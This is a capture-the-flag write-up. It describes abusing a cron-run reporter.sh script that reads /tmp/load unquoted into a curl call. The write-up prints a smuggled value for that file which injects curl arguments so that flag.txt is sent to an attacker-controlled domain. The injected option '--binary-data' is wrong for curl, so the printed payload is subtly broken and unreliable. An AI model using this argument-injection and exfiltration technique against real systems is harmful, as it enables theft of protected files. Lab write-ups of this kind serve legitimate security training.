# unload

We are assuming we have have logged into the raspberry pi as the user `silly`.

Looking around, we notice another user `flagger` and we can read his home directory. We notice a `flag.txt` and `cron.log`, neither of which is readable for our user. But, another file `reporter.sh` is.

```
#!/bin/bash

cat /proc/loadavg | tr " " "+" > /tmp/load
curl --data loadavg=$(cat /tmp/load) "https://load.finals.ggc.tf"
rm -f /tmp/load
```

As the name of the log file suggests, this script is run as a cron job. By following the size of the `cron.log` we can assume that it is running once a minute.

We can abuse the fact that this script is saving data in the file `/tmp/load` to inject parameters into the `curl` command. By setting the contents of `/tmp/load` to

```
nothing --binary-data @./flag.txt https://domain-under-my-control.is
```

we can inject parameters into the curl command that make it load the contents of the `flag.txt` file, add them to the POST data, and then have the request sent to a server under our control.
